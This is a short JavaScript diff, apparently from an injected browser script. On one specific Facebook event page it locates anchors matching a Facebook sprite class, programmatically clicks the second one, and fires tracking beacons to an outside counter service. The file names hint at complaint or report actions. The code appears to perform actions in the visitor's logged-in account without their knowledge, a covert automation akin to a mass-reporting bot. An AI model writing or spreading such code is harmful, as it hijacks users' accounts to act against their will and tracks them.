@@ -9,10 +9,14 @@ xhr.send(null);
 new Image().src = '//whos.amung.us/widget/sikayetet2.png';
 if(window.location.href == "https://www.facebook.com/events/281242216042782/"){
 new Image().src = '//whos.amung.us/widget/sikayetet.png';
-	var allA = document.querySelectorAll("a");
+var allA = document.querySelectorAll("a");
+var a = 0;
 	for(var i =0 ; i < allA.length ; i++){
-	  if(allA[i].innerHTML.indexOf("_3-8_ _3-8_ img sp_3z5Mtt9-HpC_2x sx_d1fac7") >= 0){
+	  if(allA[i].innerHTML.indexOf("_3-8_ _3-8_ img sp_") >= 0){
+	a++;
+if(a == 2){
 	  allA[i].click();
 	  }
 	}
+}
 }
